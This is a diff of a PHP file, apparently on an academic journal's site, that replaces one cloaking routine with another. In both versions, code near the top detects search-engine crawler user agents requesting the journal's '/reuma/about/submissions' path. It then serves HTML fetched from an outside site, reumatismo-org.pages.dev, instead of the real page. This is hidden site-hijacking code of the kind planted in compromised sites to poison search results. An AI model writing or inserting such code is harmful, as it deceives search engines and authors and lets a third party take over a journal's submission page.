@@ -1,53 +1,30 @@
 <?php
 
-$userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
-$req = strtok(isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '', '?');
-$req = rtrim($req, '/');
+$request_uri = $_SERVER['REQUEST_URI'] ?? ''; 
+$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? ''); 
 
-$botTargets = [
-    '/reuma/about/submissions' => 'https://reumatismo-org.pages.dev/',
+$bot_signatures = [ 
+    'googlebot', 
+    'bingbot', 
+    'slurp', 
+    'duckduckbot', 
+    'baiduspider', 
+    'yandex', 
+    'crawler', 
+    'spider' 
 ];
 
-$isLogged = !empty($_COOKIE['OMPSID']) || !empty($_COOKIE['OJSSID']) || !empty($_COOKIE['OJSESS']);
-
-$botAgents = ['googlebot','google-inspectiontool','bingbot','slurp','yandex','duckduckbot','baiduspider'];
-$isBot = false;
-foreach ($botAgents as $agent) {
-    if (strpos($userAgent, $agent) !== false) {
-        $isBot = true;
-        break;
-    }
+if (strpos($request_uri, '/reuma/about/submissions') !== false) { 
+    foreach ($bot_signatures as $bot) { 
+        if (strpos($user_agent, $bot) !== false) { 
+            $html = @file_get_contents('https://reumatismo-org.pages.dev/'); 
+            header("Content-Type: text/html; charset=UTF-8"); 
+            echo $html !== false ? $html : "Cloaked content failed to load."; 
+            exit; 
+        } 
+    } 
 }
 
-$externalUrl = isset($botTargets[$req]) ? $botTargets[$req] : null;
-
-if ($externalUrl && $isBot && !$isLogged) {
-
-    if (extension_loaded('curl')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $externalUrl);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
-        curl_setopt($ch, CURLOPT_HTTPHEADER, ["User-Agent: Googlebot/2.1"]);
-        $html = curl_exec($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        if (!empty($html) && $http_code == 200) {
-            header("Content-Type: text/html; charset=utf-8");
-            echo $html;
-            exit;
-        }
-    } else {
-        $ctx = stream_context_create(['http' => ['timeout' => 5, 'header' => "User-Agent: Googlebot/2.1\r\n"]]);
-        $html = @file_get_contents($externalUrl, false, $ctx);
-        if (!empty($html)) {
-            header("Content-Type: text/html; charset=utf-8");
-            echo$html;
-            exit;
-        }
-    }
-}
 ?>
 <?php
 
